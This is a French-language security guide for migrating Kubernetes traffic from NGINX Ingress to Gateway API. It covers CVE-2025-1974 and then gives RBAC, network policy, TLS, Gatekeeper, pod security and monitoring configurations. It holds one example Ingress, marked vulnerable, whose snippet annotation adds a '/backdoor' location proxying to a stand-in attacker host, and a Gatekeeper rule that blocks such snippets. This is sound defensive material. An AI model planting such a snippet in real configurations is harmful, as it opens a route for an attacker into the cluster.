# Sécurité - Migration NGINX Ingress → Gateway API

## Vue d'ensemble

Ce document décrit les considérations de sécurité pour la migration de NGINX Ingress vers Gateway API, avec un focus particulier sur la CVE-2025-1974 et les bonnes pratiques de sécurisation.

## CVE-2025-1974: Analyse détaillée

### Vulnérabilité

- **CVE ID**: CVE-2025-1974
- **Score CVSS**: 9.8 (Critical)
- **Type**: Remote Code Execution (RCE)
- **Composant affecté**: NGINX Ingress Controller
- **Vecteur d'attaque**: Annotations `configuration-snippet` et `server-snippet`

### Scénario d'exploitation

```yaml
# VULNÉRABLE - Ne JAMAIS utiliser
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: vulnerable-ingress
  annotations:
    nginx.ingress.kubernetes.io/configuration-snippet: |
      location /backdoor {
        proxy_pass http://attacker-server.com;
      }
    
    nginx.ingress.kubernetes.io/server-snippet: |
      location ~ /\.git {
        deny all;
        return 403;
      }
      # Attaquant peut injecter du code NGINX ici
spec:
  # ...
```

**Impact potentiel** :
1. Exécution de code arbitraire sur les pods NGINX Ingress
2. Accès aux secrets Kubernetes via ServiceAccount
3. Pivoting vers d'autres ressources du cluster
4. Exfiltration de données sensibles

### Mitigation par Gateway API

Gateway API **élimine complètement** les snippets. Toute configuration passe par:
- CRDs typés et validés
- Admission webhooks
- RBAC strict

```yaml
# SÉCURISÉ - Gateway API
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: secure-route
spec:
  parentRefs:
    - name: main-gateway
  rules:
    - filters:
        - type: URLRewrite  # Filtre typé, validé
          urlRewrite:
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /new-path
      backendRefs:
        - name: backend-service
          port: 80
```

## Architecture de sécurité

### Défense en profondeur (Defense in Depth)

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Réseau                                             │
│ • NetworkPolicies (deny-all par défaut)                    │
│ • Firewall Proxmox/Hyperviseur                             │
│ • VLANs/Segmentation                                        │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 2: Gateway API                                        │
│ • TLS termination                                           │
│ • Rate limiting                                             │
│ • Authentication/Authorization                              │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 3: RBAC Kubernetes                                    │
│ • Séparation Gateway/HTTPRoute                              │
│ • ReferenceGrants explicites                                │
│ • Service Account minimal privileges                        │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 4: Policy Enforcement                                 │
│ • OPA Gatekeeper / Kyverno                                  │
│ • Pod Security Standards (PSS)                              │
│ • Validation webhooks                                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 5: Runtime Security                                   │
│ • Seccomp/AppArmor/SELinux                                  │
│ • Read-only root filesystem                                 │
│ • Non-root containers                                       │
└─────────────────────────────────────────────────────────────┘
```

## Implémentation des contrôles de sécurité

### 1. RBAC: Séparation des rôles

**Infrastructure Team** (peut gérer Gateways) :

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: gateway-admin
rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["gateways", "gatewayclasses"]
    verbs: ["*"]
  - apiGroups: [""]
    resources: ["secrets"]  # Pour TLS certs
    verbs: ["get", "list"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: gateway-admin-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: gateway-admin
subjects:
  - kind: Group
    name: infrastructure-team
    apiGroup: rbac.authorization.k8s.io
```

**Application Team** (peut gérer HTTPRoutes uniquement) :

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: httproute-manager
  namespace: production
rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["httproutes"]
    verbs: ["*"]
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["get", "list"]  # Read-only sur services

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: httproute-manager-binding
  namespace: production
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: httproute-manager
subjects:
  - kind: Group
    name: app-team-production
    apiGroup: rbac.authorization.k8s.io
```

### 2. Network Policies

**Deny-all par défaut** :

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: demo-apps
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

**Autoriser Gateway → App** :

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-gateway
  namespace: demo-apps
spec:
  podSelector:
    matchLabels:
      app: demo-app-v2
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: envoy-gateway-system
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: envoy-gateway
      ports:
        - protocol: TCP
          port: 80
```

**Autoriser App → Database** :

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-to-database
  namespace: demo-apps
spec:
  podSelector:
    matchLabels:
      app: demo-app-v2
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              name: databases
        - podSelector:
            matchLabels:
              app: postgresql
      ports:
        - protocol: TCP
          port: 5432
    - to:  # DNS
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
        - podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
```

### 3. TLS/mTLS

**Installer cert-manager** :

```bash
kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.14.0/cert-manager.yaml
```

**ClusterIssuer Let's Encrypt** :

```yaml
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: letsencrypt-prod
spec:
  acme:
    server: https://acme-v02.api.letsencrypt.org/directory
    email: admin@example.com
    privateKeySecretRef:
      name: letsencrypt-prod-key
    solvers:
      - http01:
          ingress:
            class: gateway-api
```

**Certificate pour Gateway** :

```yaml
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: gateway-tls-cert
  namespace: gateway-system
spec:
  secretName: gateway-tls-cert
  issuerRef:
    name: letsencrypt-prod
    kind: ClusterIssuer
  dnsNames:
    - "*.example.com"
    - "example.com"
```

**Gateway avec TLS** :

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: main-gateway
  namespace: gateway-system
spec:
  gatewayClassName: eg
  listeners:
    - name: https
      protocol: HTTPS
      port: 443
      tls:
        mode: Terminate
        certificateRefs:
          - kind: Secret
            name: gateway-tls-cert
      allowedRoutes:
        namespaces:
          from: All
```

### 4. Policy Enforcement avec OPA Gatekeeper

**Installer Gatekeeper** :

```bash
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/master/deploy/gatekeeper.yaml
```

**Contrainte: Interdire les snippets NGINX** :

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenynginxsnippets
spec:
  crd:
    spec:
      names:
        kind: K8sDenyNginxSnippets
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sdenynginxsnippets
        
        violation[{"msg": msg}] {
          input.review.kind.kind == "Ingress"
          annotations := input.review.object.metadata.annotations
          
          # Vérifier les annotations dangereuses
          snippet_keys := [
            "nginx.ingress.kubernetes.io/configuration-snippet",
            "nginx.ingress.kubernetes.io/server-snippet"
          ]
          
          some key
          snippet_keys[_] = key
          annotations[key]
          
          msg := sprintf("SÉCURITÉ: Annotation '%v' interdite (CVE-2025-1974)", [key])
        }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sDenyNginxSnippets
metadata:
  name: deny-nginx-snippets
spec:
  match:
    kinds:
      - apiGroups: ["networking.k8s.io"]
        kinds: ["Ingress"]
```

**Contrainte: Forcer TLS sur HTTPRoute** :

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiretls
spec:
  crd:
    spec:
      names:
        kind: K8sRequireTLS
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiretls
        
        violation[{"msg": msg}] {
          input.review.kind.kind == "HTTPRoute"
          route := input.review.object
          
          # Vérifier que parentRef pointe vers listener HTTPS
          some i
          parent := route.spec.parentRefs[i]
          not parent.sectionName == "https"
          
          msg := "HTTPRoute doit utiliser un listener HTTPS"
        }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireTLS
metadata:
  name: require-tls-httproute
spec:
  match:
    kinds:
      - apiGroups: ["gateway.networking.k8s.io"]
        kinds: ["HTTPRoute"]
  parameters:
    exemptNamespaces:
      - kube-system
```

### 5. Pod Security Standards

**Enforce Restricted PSS** :

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: demo-apps
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**PodSecurityPolicy alternative (SecurityContext)** :

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
        seccompProfile:
          type: RuntimeDefault
      
      containers:
        - name: app
          image: app:latest
          securityContext:
            allowPrivilegeEscalation: false
            capabilities:
              drop:
                - ALL
            readOnlyRootFilesystem: true
          
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      
      volumes:
        - name: tmp
          emptyDir: {}
```

## Audit et Monitoring

### 1. Audit Logs Kubernetes

```yaml
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log toutes les modifications sur Gateway API
  - level: RequestResponse
    verbs: ["create", "update", "patch", "delete"]
    resources:
      - group: "gateway.networking.k8s.io"
        resources: ["gateways", "httproutes"]
  
  # Log les accès aux Secrets
  - level: Metadata
    verbs: ["get", "list"]
    resources:
      - group: ""
        resources: ["secrets"]
```

### 2. Alertes Prometheus

```yaml
groups:
  - name: gateway-api-security
    rules:
      # Alerte: Taux d'erreur 5xx élevé
      - alert: HighErrorRate
        expr: |
          sum(rate(envoy_http_downstream_rq_xx{response_code_class="5"}[5m]))
          /
          sum(rate(envoy_http_downstream_rq_xx[5m]))
          > 0.05
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Taux d'erreur 5xx > 5%"
      
      # Alerte: Tentative d'accès non autorisé
      - alert: UnauthorizedAccess
        expr: |
          sum(rate(envoy_http_downstream_rq_xx{response_code="403"}[5m])) > 10
        for: 2m
        labels:
          severity: warning
        annotations:
          summary: "Tentatives d'accès 403 anormales"
      
      # Alerte: Certificat TLS expire bientôt
      - alert: TLSCertificateExpiring
        expr: |
          (certmanager_certificate_expiration_timestamp_seconds - time()) / 86400 < 30
        labels:
          severity: warning
        annotations:
          summary: "Certificat TLS expire dans moins de 30 jours"
```

## Checklist de sécurité

### Avant migration

- [ ] Audit complet des Ingress existants
- [ ] Identification des snippets/annotations à risque
- [ ] Mapping des configurations vers Gateway API
- [ ] Plan de rollback défini
- [ ] Backup des configurations

### Pendant migration

- [ ] Tests de sécurité (OWASP ZAP, Burp Suite)
- [ ] Validation des certificats TLS
- [ ] Vérification des NetworkPolicies
- [ ] Monitoring actif des anomalies
- [ ] Documentation des changements

### Après migration

- [ ] Désactivation NGINX Ingress
- [ ] Suppression des snippets
- [ ] Audit logs activés
- [ ] Alertes configurées
- [ ] Formation équipes
- [ ] Revue post-migration

## Ressources

- [Gateway API Security Model](https://gateway-api.sigs.k8s.io/concepts/security-model/)
- [OWASP Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)